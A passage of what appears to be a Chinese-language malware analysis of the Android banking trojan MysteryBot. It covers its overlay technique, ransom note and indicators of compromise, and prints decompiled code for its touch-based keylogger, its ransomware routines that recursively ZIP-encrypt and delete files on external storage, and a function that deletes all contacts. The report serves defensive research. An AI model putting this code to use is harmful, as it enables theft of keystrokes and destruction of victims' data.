        windowManager.y = int10; 
        this.systemServiceWindow.addView(this.keyboardLayer3[j], ((ViewGroup$LayoutParams) windowManager)); 
        ++j;
    }
此代码片段显示用于保存击键的函数，该函数驻留在“HandleKeystrokeLayerN”类中。请注意，如果该值等于“4”，则会导致“[ACTION_OUTSIDE](https://developer.android.com/reference/android/view/MotionEvent.html#ACTION_OUTSIDE)”，只有当用户触摸UI元素(视图)之外屏幕上的某个位置时，才会激活该值。由于视图是0乘0像素，这应该始终是正确的，但如果这在某种程度上不同，击键不被记录。
    public boolean onTouch(View view, MotionEvent motionEvent) { 
        view.performClick(); 
        if(motionEvent.getAction() == 4) { 
            Keylogger.setKeyStroke(this.keylogger, Keylogger.getMotionEventFlagTotal(this.keylogger) + motionEvent.getFlags()); 
        } 
        return 0;
    }
此代码片段显示是否使用Shift或ALT键，存储为布尔值，如下面的方法所示。由于它使用自身的XOR值，因此true值被设置为false，反之亦然。
    if(character.equals("alt") { 
        Keylogger.setAltEnabled(this.keylogger, Keylogger.getIsAltEnabled(this.keylogger) ^ 1); 
    }
    if(character.equals("shift") { 
        Keylogger.getShiftEnabled(this.keylogger, Keylogger.setShift(this.keylogger) ^ 1); 
    }
此代码片段显示如何保存记录的击键(使用简单的检查)。
    if (!character.equals("outside") && !character.equals("symbols") && !character.equals("alt") && !character.equals("misc") && !character.equals("shift") && !character.equals("back") && !character.equals("enter")  { 
        keylogger = this.keylogger; 
        currentStroke = new StringBuilder().insert(0, Keylogger.getCurrentStroke(this.keylogger)); 
        currentStroke.append(character); 
        Keylogger.setCurrentStroke(keylogger, currentStroke.toString());
    }
## 勒索软件
一个名为“Myster_L0cker”的操作界面，如下截图所示：
[](https://p1.ssl.qhimg.com/t01d2922f51a9acd129.png "用于管理勒索受害者的界面的截图")
MysteryBot还嵌入了一个ransomware特性，允许自己单独加密外部存储目录中的所有文件，包括每个子目录，然后删除原始文件。加密过程将每个文件放入一个单独的ZIP存档中，该存档受密码保护，所有ZIP存档的密码都是相同的，并且是在运行时生成的。加密过程完成后，用户会收到一个对话框，指责受害者观看色情材料。要检索密码并能够解密文件，用户需要通过电子邮件将参与者的电子邮件发送到他的电子邮件地址：
    googleprotect[at]mail.ru
在分析Ransomware功能的过程中，出现了两个失败的地方：
首先，加密过程中使用的密码只有8个字符长，由拉丁字母的所有字符(大小写)和数字组成。要从其中挑选的字符总数为62个，使可能组合的总数达到62到8的幂，这可能过于粗暴的，并带有相关的处理能力。
其次，分配给每个受害者的ID可以是0到9999之间的数字。由于没有对现有ID进行验证，因此C2数据库中可能存在具有相同ID的另一个受害者，从而覆盖C2数据库中的ID。导致具有重复ID的老年受害者无法恢复他们的文件。
这个代码片段显示了用于生成加密过程中使用的密码的过程：GeneratePassword()
    public static String generatePassword() { 
        Random random = new Random(); 
        StringBuilder passwordLength8 = new StringBuilder(); 
        String seed = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"; 
        for (int i = 0; i < 8; i++) { 
            int characterLocation = random.nextInt(seed.length()); 
            char currentChar = seed.charAt(characterLocation); 
            passwordLength8.append(currentChar); 
        } 
        return passwordLength8.toString();
    }
这个代码片段显示了递归扫描目录的代码：ScanDirectory()
    public void scanDirectory(File file) { 
        try { 
            File[] fileArray = file.listFiles(); 
            if (fileArray == null) { 
                return; 
            } 
            int amountOfFiles = fileArray.length; 
            for (int i = 0; i < amountOfFiles; i++) { 
                File currentFile = fileArray[i]; 
                if (currentFile.isDirectory()) { 
                    this.scanDirectory(currentFile); 
                } else { 
                    this.deleteFileEncryptInZip(currentFile); 
                } 
            } 
        } catch (Exception ex) { 
            ex.printStackTrace(); 
        }
    }
这个代码片段显示了用于加密给定目录的代码：delteFileEncryptInZip()
    public String deleteFileEncryptInZip(File file) { 
        try { 
            StringBuilder canonicalPath = new StringBuilder().insert(0, file.getCanonicalPath()); 
            canonicalPath.append(".zip"); 
            ZipFile zipFile = new ZipFile(canonicalPath.toString()); 
            ArrayList paths = new ArrayList(); 
            paths.add(new File(String.valueOf(file))); 
            ZipParameters zipParameters = new ZipParameters(); 
            zipParameters.setCompressionMethod(8); 
            zipParameters.setCompressionLevel(5); 
            zipParameters.setEncryptFiles(true); 
            zipParameters.setEncryptionMethod(99); 
            zipParameters.setAesKeyStrength(3); 
            zipParameters.setPassword(this.password); 
            zipFile.addFiles(paths, zipParameters); 
            file.delete(); 
            StringBuilder dblocksPath = new StringBuilder(); 
            dblocksPath.append(Environment.getExternalStorageDirectory()); 
            dblocksPath.append("/dblocks.txt"); 
            BufferedWriter bufferedWriter = new BufferedWriter(new FileWriter(new File(dblocksPath.toString()), true)); 
            bufferedWriter.write("+1n"); 
            bufferedWriter.close(); 
        } catch (Exception ex) { 
            ex.printStackTrace(); 
        } 
        return ""; 
    }
这个代码片段显示了所有联系人的删除：delteContact()
    private void deleteContacts() { 
        ContentResolver contentResolver = this.getContentResolver(); 
        Cursor contacts = contentResolver.query(ContactsContract$Contacts.CONTENT_URI, null, null, null, null); 
        while(contacts.moveToNext()) { 
            try { 
                contentResolver.delete(Uri.withAppendedPath(ContactsContract$Contacts.CONTENT_LOOKUP_URI, contacts.getString(contacts.getColumnIndex(LL.LLdecrypt("u0007Mu0004Iu001ER")))), null, null);  // lookup 
            } 
            catch(Exception ex) { 
                System.out.println(ex.getStackTrace()); 
            } 
        } 
        new ScanAndEncryptAsync(this).execute(new Integer[]{Integer.valueOf(1)});
    }
## 覆盖目标
get_inj_list 操作从C&C服务器检索带有覆盖的目标应用程序，注意在编写本文时，参与者正在扩展和进一步开发这个覆盖操作类。
以下是实际目标应用程序的列表(撰写本文时仍在开发中)：
[](https://p1.ssl.qhimg.com/t01ccee49a2b76d2b6e.jpg)
## 结论
尽管某些Android银行恶意木马家族如ExoBot 2.5、Anubis II、DiseaseBot等一直在探索对Android
7和8进行覆盖攻击的新技术，但MysteryBot背后的开发者似乎已经成功地实现了一种解决方案，并在创新上花了一些时间。覆盖攻击的实现滥用了使用访问权限，以便在Android操作系统的所有版本(包括最新的Android
7和8)上运行。
MysteryBot开发者使用这个新实现对密钥记录进行了创新。有效降低检测率并限制启用记录器所需的用户交互。实际上，关键日志记录机制基于屏幕上的接触点，而不是使用经常被滥用的Android可访问性服务，这意味着它比通常的击键更有可能记录更多的日志。该勒索软件还包括一个新的高度恼人的功能——删除接触名单中的受感染设备，这是银行木马到目前为止没有观察到的东西。其次，尽管仍在开发中的另一个功能引起了我们的注意，根据使用中的命名约定，名为GetMail的功能似乎是为了从受感染的设备收集电子邮件消息。增强的覆盖攻击还运行在最新的Android版本上，结合了先进的键盘记录和潜在的开发功能，将允许MysteryBot获取广泛的个人可识别信息，以执行欺诈。
在过去的6个月中，我们观察到代理、键盘记录、远程访问、录音和文件上传等功能越来越普遍；我们怀疑这种趋势只会在将来增长。这些功能的问题在于，除了绕过安全和检测措施之外，这些功能使威胁更少地针对目标，而更具有机会主义。例如，键盘记录、远程访问、文件上传和录音允许在没有特定触发器的情况下获取高级信息(即使受害者不进行网上银行业务，信息也可能被窃取和记录)。如果我们对此类行为增加的预期成为事实，这意味着金融机构将很难评估它们是否成为特定威胁的目标，所有受感染的设备都可能成为欺诈和间谍活动的来源。
## IOC
请注意，在撰写本文时，MysteryBot仍处于开发阶段，尚未广泛传播。
AdobeFlashPlayer(install.app)  
334f1efd0b347d54a418d1724d51f8451b7d0bebbd05f648383d05c00726a7ae